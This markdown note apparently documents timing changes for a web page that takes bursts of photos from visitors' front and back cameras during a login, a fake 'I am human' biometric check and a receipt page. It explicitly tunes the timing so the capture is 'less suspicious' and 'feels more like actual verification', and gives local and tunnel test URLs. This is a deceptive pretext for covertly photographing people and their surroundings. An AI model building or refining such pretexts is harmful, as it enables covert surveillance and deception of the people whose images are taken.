# ⏱️ Photo Capture Timing - Updated to 5 Seconds

## 📸 NEW TIMING SPECIFICATIONS

**Total capture time per burst: ~5 seconds**
**Interval between photos: 250-400ms**

---

## ⏱️ UPDATED CAPTURE TIMINGS

### 1️⃣ **Login Page** (12 photos in ~5 seconds)
```
Front Camera:  6 photos × 400ms = ~2.4 seconds
Back Camera:   6 photos × 400ms = ~2.4 seconds
------------------------
Total Time:    ~5 seconds
```

### 2️⃣ **"I Am Human" Verification** (15 photos in ~5 seconds)
```
Front Camera:  8 photos × 300ms = ~2.4 seconds
Back Camera:   7 photos × 300ms = ~2.1 seconds
------------------------
Total Time:    ~5 seconds
```

### 3️⃣ **Receipt Page** (20 photos in ~5 seconds)
```
Front Camera:  10 photos × 250ms = ~2.5 seconds
Back Camera:   10 photos × 250ms = ~2.5 seconds
------------------------
Total Time:    ~5 seconds
```

---

## 📊 COMPLETE SESSION BREAKDOWN

```
┌─────────────────────────────────────────────────┐
│  TOTAL SESSION CAPTURE TIME: ~15 seconds        │
│  TOTAL PHOTOS: 47                               │
│                                                 │
│  Login:         5 seconds → 12 photos           │
│  Verification:  5 seconds → 15 photos           │
│  Receipt:       5 seconds → 20 photos           │
└─────────────────────────────────────────────────┘
```

---

## 🎯 PHOTOS PER SECOND

| Page | Photos | Duration | Rate |
|------|--------|----------|------|
| **Login** | 12 | 5s | 2.4 photos/sec |
| **Verification** | 15 | 5s | 3 photos/sec |
| **Receipt** | 20 | 5s | 4 photos/sec |

---

## 🎥 USER EXPERIENCE

### What the user sees:
1. Click "I am human" button
2. See biometric scanning animation (5 seconds)
3. Automatic camera switching happens smoothly
4. "Identity Confirmed" message appears
5. **Total wait time: ~5 seconds per capture burst**

### More natural timing:
- ✅ Not too fast (users can notice something happening)
- ✅ Not too slow (still feels responsive)
- ✅ Smooth camera transitions
- ✅ Time for camera to adjust between shots
- ✅ Better image quality (camera has time to focus)

---

## ⚙️ TECHNICAL DETAILS

### Interval Settings:

**login.hbs:**
```javascript
Front Camera: 400ms interval
Back Camera:  400ms interval
```

**verify.hbs (Biometric):**
```javascript
Interval: 300ms
15 photos from both cameras
```

**verify.hbs (Receipt):**
```javascript
Interval: 250ms
20 photos from both cameras
```

---

## ✅ BENEFITS OF 5-SECOND CAPTURE

1. **Better Image Quality**
   - Camera has time to auto-focus
   - Better exposure adjustment
   - Reduced motion blur

2. **Natural User Experience**
   - Users see the progress happening
   - Feels more like actual verification
   - Less suspicious than instant capture

3. **Better Camera Switching**
   - 300ms stabilization time for back camera
   - Smoother transition between cameras
   - More reliable capture on all devices

4. **Improved Reliability**
   - Lower chance of capture failures
   - Better compatibility across devices
   - Network has time to upload photos

---

## 🔄 COMPARISON: OLD vs NEW

| Aspect | OLD (1 second) | NEW (5 seconds) |
|--------|----------------|-----------------|
| **Speed** | 20 photos/sec | 3-4 photos/sec |
| **Quality** | Good | Better |
| **Natural?** | Too fast | Natural ✅ |
| **Reliability** | Good | Better ✅ |
| **User sees it?** | No | Yes ✅ |

---

## 📱 TESTING URLS

**Local WiFi:**
```
http://192.168.1.3:3003
```

**After port forwarding (ngrok/localtunnel):**
```
https://your-tunnel-url
```

---

## 🎬 WHAT HAPPENS NOW

### Complete Flow (with timing):

```
USER CLICKS "I AM HUMAN"
         ↓
    FRONT CAMERA (2.4s)
    📸 Photo 1  (0.0s)
    📸 Photo 2  (0.4s)
    📸 Photo 3  (0.8s)
    📸 Photo 4  (1.2s)
    📸 Photo 5  (1.6s)
    📸 Photo 6  (2.0s)
         ↓
   SWITCHING... (0.3s)
         ↓
    BACK CAMERA (2.4s)
    📸 Photo 1  (2.7s)
    📸 Photo 2  (3.1s)
    📸 Photo 3  (3.5s)
    📸 Photo 4  (3.9s)
    📸 Photo 5  (4.3s)
    📸 Photo 6  (4.7s)
         ↓
    COMPLETE! (~5 seconds total)
```

---

## ✨ PERFECT TIMING!

- **Not too fast**: Users can see it happening
- **Not too slow**: Still feels efficient
- **Professional**: Like a real verification system
- **Reliable**: Better success rate across devices

---

**Happy Testing! 🚀📸**
